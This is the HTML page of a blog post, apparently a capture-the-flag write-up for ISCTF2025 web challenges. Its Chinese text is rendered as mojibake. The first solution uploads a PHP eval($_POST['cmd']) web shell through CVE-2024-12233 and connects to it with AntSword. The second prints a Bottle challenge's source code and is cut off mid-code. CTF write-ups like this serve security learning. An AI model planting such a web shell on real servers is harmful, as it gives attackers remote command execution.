<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ISCTF2025 wp | Welcome To yanxi Blog</title><meta name="author" content="yanxi sishi"><meta name="copyright" content="yanxi sishi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1. \b@by n0t1ce b0ardæç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯CVE-2024-12233ï¼Œä¸Šç½‘æŸ¥æ‰¾è¿›è¡Œå¤ç° ä¾‹å¦‚Email: 111@test.comï¼ŒåŒæ—¶ä¸Šä¼ shell.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;  ç„¶åèšå‰‘è¿æ¥http:&#x2F;&#x2F;[é¢˜ç›®IP]&#x2F;images&#x2F;111@test.">
<meta property="og:type" content="article">
<meta property="og:title" content="ISCTF2025 wp">
<meta property="og:url" content="http://example.com/2025/12/11/ISCTF2025%20wp/index.html">
<meta property="og:site_name" content="Welcome To yanxi Blog">
<meta property="og:description" content="1. \b@by n0t1ce b0ardæç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯CVE-2024-12233ï¼Œä¸Šç½‘æŸ¥æ‰¾è¿›è¡Œå¤ç° ä¾‹å¦‚Email: 111@test.comï¼ŒåŒæ—¶ä¸Šä¼ shell.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;  ç„¶åèšå‰‘è¿æ¥http:&#x2F;&#x2F;[é¢˜ç›®IP]&#x2F;images&#x2F;111@test.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/isctf/isctf2025.png">
<meta property="article:published_time" content="2025-12-11T08:36:00.237Z">
<meta property="article:modified_time" content="2025-12-11T08:55:07.544Z">
<meta property="article:author" content="yanxi sishi">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ISCTF">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/isctf/isctf2025.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ISCTF2025 wp",
  "url": "http://example.com/2025/12/11/ISCTF2025%20wp/",
  "image": "http://example.com/img/isctf/isctf2025.png",
  "datePublished": "2025-12-11T08:36:00.237Z",
  "dateModified": "2025-12-11T08:55:07.544Z",
  "author": [
    {
      "@type": "Person",
      "name": "yanxi sishi",
      "url": "http://example.com"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/12/11/ISCTF2025%20wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"æœªæ‰¾åˆ°ç¬¦åˆæ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}","hits_stats":"å…±æ‰¾åˆ° ${hits} ç¯‡æ–‡ç« "}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç°¡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ISCTF2025 wp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><link href="https://fonts.loli.net/css2?family=Great+Vibes&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"><style>
  /* ç¦æ­¢å¤´åƒæ—‹è½¬ */
  #aside-content .card-info .avatar-img {
    transition: none !important;
    transform: none !important;
    animation: none !important;
  }
  #aside-content .card-info .avatar-img:hover {
    transform: none !important;
    animation: none !important; 
  }
  /* å¼ºåˆ¶æ˜¾ç¤ºæ’­æ”¾å™¨åœ¨å³ä¸‹è§’ */
  .aplayer-fixed {
    z-index: 99999 !important;
    display: block !important;
  }
</style>
<meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/url(/img/bg.png));"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa-solid fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%AF%94%E8%B5%9BWP/"><i class="fa-fw fa-solid fa-trophy"></i><span> æ¯”èµ›WP</span></a></div><div class="menus_item"><span class="site-page group"><span> ç¼–ç¨‹è¯­è¨€</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"><i class="fa-fw fa-solid fa-code"></i><span> æ€»è§ˆ</span></a></li><li><a class="site-page child" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80/"><i class="fa-fw fa-solid fa-c"></i><span> Cè¯­è¨€</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/web%E5%AD%A6%E4%B9%A0/"><i class="fa-fw fa-solid fa-book-open"></i><span> Webå­¦ä¹ </span></a></div><div class="menus_item"><span class="site-page group"><span> å¹³å°WP</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%B9%B3%E5%8F%B0WP/"><i class="fa-fw fa-solid fa-folder-open"></i><span> æ€»è§ˆ</span></a></li><li><a class="site-page child" href="/categories/%E5%B9%B3%E5%8F%B0WP/NSSCTF/"><i class="fa-fw fa-solid fa-bolt"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/%E5%B9%B3%E5%8F%B0WP/CTFShow/"><i class="fa-fw fa-solid fa-flag"></i><span> CTFShow</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/isctf/isctf2025.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Welcome To yanxi Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">ISCTF2025 wp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa-solid fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-archive"></i><span> å½’æ¡£</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%AF%94%E8%B5%9BWP/"><i class="fa-fw fa-solid fa-trophy"></i><span> æ¯”èµ›WP</span></a></div><div class="menus_item"><span class="site-page group"><span> ç¼–ç¨‹è¯­è¨€</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"><i class="fa-fw fa-solid fa-code"></i><span> æ€»è§ˆ</span></a></li><li><a class="site-page child" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80/"><i class="fa-fw fa-solid fa-c"></i><span> Cè¯­è¨€</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/web%E5%AD%A6%E4%B9%A0/"><i class="fa-fw fa-solid fa-book-open"></i><span> Webå­¦ä¹ </span></a></div><div class="menus_item"><span class="site-page group"><span> å¹³å°WP</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%B9%B3%E5%8F%B0WP/"><i class="fa-fw fa-solid fa-folder-open"></i><span> æ€»è§ˆ</span></a></li><li><a class="site-page child" href="/categories/%E5%B9%B3%E5%8F%B0WP/NSSCTF/"><i class="fa-fw fa-solid fa-bolt"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/%E5%B9%B3%E5%8F%B0WP/CTFShow/"><i class="fa-fw fa-solid fa-flag"></i><span> CTFShow</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ISCTF2025 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-12-11T08:36:00.237Z" title="å‘è¡¨äº 2025-12-11 16:36:00">2025-12-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-12-11T08:55:07.544Z" title="æ›´æ–°äº 2025-12-11 16:55:07">2025-12-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9BWP/">æ¯”èµ›WP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-b-by-n0t1ce-b0ard"><a href="#1-b-by-n0t1ce-b0ard" class="headerlink" title="1. \b@by n0t1ce b0ard"></a>1. \b@by n0t1ce b0ard</h1><p>æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œæ˜¯CVE-2024-12233ï¼Œä¸Šç½‘æŸ¥æ‰¾è¿›è¡Œå¤ç°</p>
<p>ä¾‹å¦‚Email: <code>111@test.com</code>ï¼ŒåŒæ—¶ä¸Šä¼ shell.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åèšå‰‘è¿æ¥http:&#x2F;&#x2F;[é¢˜ç›®IP]&#x2F;images&#x2F;<a href="mailto:&#49;&#x31;&#x31;&#x40;&#x74;&#x65;&#115;&#116;&#46;&#x63;&#x6f;&#x6d;">111@test.com</a>&#x2F;shell.php</p>
<hr>
<h1 id="2-éš¾è¿‡çš„bottle"><a href="#2-éš¾è¿‡çš„bottle" class="headerlink" title="2. éš¾è¿‡çš„bottle"></a>2. éš¾è¿‡çš„bottle</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„å…³é”®è¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å®‰å…¨è§£å‹ZIPæ–‡ä»¶ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³•æ–‡ä»¶è·¯å¾„: è·¯å¾„éå†æ”»å‡»æ£€æµ‹&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é¦–é¡µ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“¤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;è½»æ¾æŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;ä¸Šä¼ ZIPæ–‡ä»¶å¹¶å®‰å…¨åœ°æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œæ— éœ€è§£å‹åˆ°æœ¬åœ°è®¾å¤‡&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“ ä¸Šä¼ ZIPæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                â„¹ï¸ äº†è§£æ›´å¤š</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        